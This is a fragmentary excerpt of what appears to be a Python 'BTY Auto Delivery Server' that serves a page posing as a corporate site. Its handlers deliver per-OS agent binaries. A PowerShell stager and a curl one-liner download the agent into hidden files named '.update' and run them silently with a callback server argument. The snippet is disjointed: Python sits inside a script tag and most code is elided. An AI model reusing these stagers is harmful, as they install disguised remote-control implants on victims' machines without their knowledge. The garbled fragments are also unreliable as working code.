...
<div class="footer">© 2024 BTY Corporation</div>
</div>
<script>
function downloadPayload() {{
    ...
    def serve_windows_payload(self):
        ...
        exe = PROJECT_ROOT / "bty-agent.exe"
        if exe.exists():
    ...
    def serve_ps1_stager(self):
        ...
        ps = f"""$c=New-Object Net.WebClient;$c.DownloadFile('http://{host}:8000/bty-agent.exe','$env:TEMP\\\\.update.exe');Start-Process -WindowStyle Hidden '$env:TEMP\\\\.update.exe' -ArgumentList '--server','{self.server_addr}'"""
    ...
    def serve_darwin_payload(self):
        """Serve macOS payload."""
        dmg = PROJECT_ROOT / "dist" / "bty-agent-darwin-amd64"
        if dmg.exists():
...
"""
    ...
    def serve_curl_instructions(self):
        ...
        cmd = f"curl -s http://{host}:8000/bty-agent -o /tmp/.update && chmod +x /tmp/.update && nohup /tmp/.update --server {self.server_addr} &>/dev/null &"
...
def main():
    ...
    parser = argparse.ArgumentParser(description="BTY Auto Delivery Server")
